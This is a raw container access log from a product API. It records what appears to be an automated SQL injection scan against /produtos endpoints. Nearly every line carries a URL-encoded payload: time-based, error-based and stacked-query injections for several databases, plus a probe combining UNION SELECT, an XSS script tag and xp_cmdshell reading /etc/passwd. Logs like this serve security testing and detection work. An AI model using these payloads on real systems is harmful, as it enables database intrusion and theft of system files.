api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9424%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29SpLf%29--%2F%2A%2A%2FbYaY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F8089%3D%28SELECT%2F%2A%2A%2F8089%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282519%3D2519 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F8089%3D%28SELECT%2F%2A%2A%2F8089%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8089%3D%28SELECT%2F%2A%2A%2F8089%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27pbVA%27%3D%27pbVA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F8089%3D%28SELECT%2F%2A%2A%2F8089%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27dYqT%27%3D%27dYqT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F8089%3D%28SELECT%2F%2A%2A%2F8089%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FXVoA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%281633%3D1633 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27aQnN%27%3D%27aQnN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27OKvk%27%3D%27OKvk HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FUJfu HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FAND%2F%2A%2A%2F7637%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28108%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284428%3D4428 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F7637%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28108%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7637%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28108%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27vxJx%27%3D%27vxJx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FAND%2F%2A%2A%2F7637%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28108%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27jSPx%27%3D%27jSPx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FAND%2F%2A%2A%2F7637%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2886%29%7C%7CCHR%28108%29%7C%7CCHR%28100%29%7C%7CCHR%2883%29%2C5%29--%2F%2A%2A%2FMePu HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FMXyB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Ftzmz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FGkfg HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FgcPL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FLRDI HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos?pcvQ=8637%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - POST /produtos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /produtos/1 HTTP/1.1
api-1  | 172.18.0.1 - PUT /produtos/1?WuFW=9060%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - PUT /produtos/1 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&XDAw=7320%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=2651 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste.%29.%22%28%2C%27%28.%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27weBoVK%3C%27%22%3EJTlEJN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3565%3D5598%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ysJp%27%3D%27ysJp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6971%3D6343%2F%2A%2A%2FAND%2F%2A%2A%2F%27ajTz%27%3D%27ajTz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7436%3D9132%2F%2A%2A%2FAND%2F%2A%2A%2F%286375%3D6375 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2585%3D3429 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9466%3D5203--%2F%2A%2A%2Fgjwg HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288319%3D7326%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F7326%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3064%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281263%2CCONCAT%280x5c%2C0x71787a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281263%3D1263%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27YNEJ%27%3D%27YNEJ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281263%2CCONCAT%280x5c%2C0x71787a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281263%3D1263%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27GpsG%27%3D%27GpsG HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281263%2CCONCAT%280x5c%2C0x71787a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281263%3D1263%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284897%3D4897 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281263%2CCONCAT%280x5c%2C0x71787a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281263%3D1263%2C1%29%29%29%2C0x7178627071%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281263%2CCONCAT%280x5c%2C0x71787a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281263%3D1263%2C1%29%29%29%2C0x7178627071%29%29--%2F%2A%2A%2FQFhR HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2976%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282976%3D2976%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Icrb%27%3D%27Icrb HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2976%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282976%3D2976%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ToPM%27%3D%27ToPM HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2976%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282976%3D2976%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285677%3D5677 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2976%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282976%3D2976%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2976%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282976%3D2976%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2Fbxhc HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8969%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288969%3D8969%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ZEhV%27%3D%27ZEhV HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8969%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288969%3D8969%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27kDAd%27%3D%27kDAd HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8969%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288969%3D8969%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287436%3D7436 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8969%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288969%3D8969%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8969%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288969%3D8969%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FZhbY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288282%3D8282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27hiJl%27%3D%27hiJl HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288282%3D8282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27pElF%27%3D%27pElF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288282%3D8282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286605%3D6605 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288282%3D8282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288282%3D8282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FISYp HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qxzjq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284822%3D4822%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbpq%27%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28120%29%7C%7CCHR%2897%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28120%29%7C%7CCHR%2897%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28120%29%7C%7CCHR%2897%29%7C%7CCHR%28118%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
